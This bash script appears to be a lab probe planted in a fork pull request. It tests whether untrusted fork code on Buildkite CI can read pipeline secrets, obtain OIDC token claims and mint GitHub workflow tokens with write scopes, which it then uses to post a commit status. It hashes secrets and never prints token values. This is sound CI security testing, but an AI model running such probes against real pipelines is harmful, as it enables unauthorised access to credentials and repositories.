#!/usr/bin/env bash
# The outsider's copy, from the fork pull request's head commit. If this runs, fork code ran.
# Secret values and the token are never printed: secrets as a short sha256 and length, the token as its decoded claims.
echo "FORK (outsider) ci.sh"
for k in BUILDKITE_BRANCH BUILDKITE_PULL_REQUEST BUILDKITE_PULL_REQUEST_REPO BUILDKITE_PULL_REQUEST_BASE_BRANCH \
         BUILDKITE_REPO BUILDKITE_SOURCE BUILDKITE_GITHUB_EVENT BUILDKITE_GITHUB_ACTION BUILDKITE_COMMIT \
         BUILDKITE_BUILD_NUMBER BUILDKITE_BUILD_CREATOR; do
  echo "$k=${!k:-}"
done
hash() { if command -v sha256sum >/dev/null; then sha256sum; else shasum -a 256; fi | cut -c1-16; }
for name in LAB_SECRET_ANY LAB_SECRET_MAIN LAB_SECRET_RELEASE; do
  if v=$(buildkite-agent secret get "$name" 2>/tmp/secret-err); then
    echo "$name: READ sha256=$(printf %s "$v" | hash) len=${#v}"
  else
    echo "$name: not readable ($(head -1 /tmp/secret-err))"
  fi
done
b64url() { local s=${1//-/+}; s=${s//_//}; case $(( ${#s} % 4 )) in 2) s+="==";; 3) s+="=";; esac; printf %s "$s" | base64 -d; }
if tok=$(buildkite-agent oidc request-token --audience sts.amazonaws.com 2>/tmp/oidc-err); then
  echo "OIDC_CLAIMS $(b64url "$(printf %s "$tok" | cut -d. -f2)")"
else
  echo "OIDC: no token ($(head -1 /tmp/oidc-err))"
fi
unset tok
# GitHub workflow token: ask Buildkite the way buildkite-gha does, naming this commit's token.yml, for more than the
# contents:read that pull-request builds are limited to. The token is never printed. If one is issued, use it once,
# for a commit status on this job's own commit in the base repository.
jget() { python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print(d.get(sys.argv[2]) or "")' "$1" "$2" 2>/dev/null; }
repo=${BUILDKITE_REPO%.git}
# mint <label> <permissions JSON>: sets $t to the token (if any) and prints the outcome, never the token.
mint() {
  local code
  code=$(curl -sS -o /tmp/wt.json -w '%{http_code}' -X POST -H "Authorization: Token $BUILDKITE_AGENT_ACCESS_TOKEN" \
    -H 'Content-Type: application/json' --data "{\"repo_url\":\"$repo\",\"workflow\":\"token.yml\",\"permissions\":$2}" \
    "$BUILDKITE_AGENT_ENDPOINT/jobs/$BUILDKITE_JOB_ID/github_workflow_access_token")
  t=$(jget /tmp/wt.json token)
  echo "WORKFLOW_TOKEN $1: HTTP $code, token issued: $([ -n "$t" ] && echo yes || echo no), denial code: $(jget /tmp/wt.json code)"
  rm -f /tmp/wt.json
}
mint "all write scopes of the lab app except contents" '{"contents":"read","statuses":"write","pull_requests":"write","issues":"write","checks":"write","deployments":"write","packages":"write"}'
mint "contents write" '{"contents":"write"}'
mint "statuses write" '{"contents":"read","statuses":"write"}'
if [ -n "$t" ]; then
  owner_repo=${repo#https://github.com/}
  s=$(curl -sS -o /tmp/st.json -w '%{http_code}' -X POST -H "Authorization: Bearer $t" -H 'Accept: application/vnd.github+json' \
    "https://api.github.com/repos/$owner_repo/statuses/$BUILDKITE_COMMIT" \
    -d '{"state":"success","context":"probe/outsider-token","description":"written by the fork job with a Buildkite workflow token"}')
  echo "GITHUB_STATUS_WRITE with that token: HTTP $s, status id $(jget /tmp/st.json id)"
  rm -f /tmp/st.json
fi
unset t
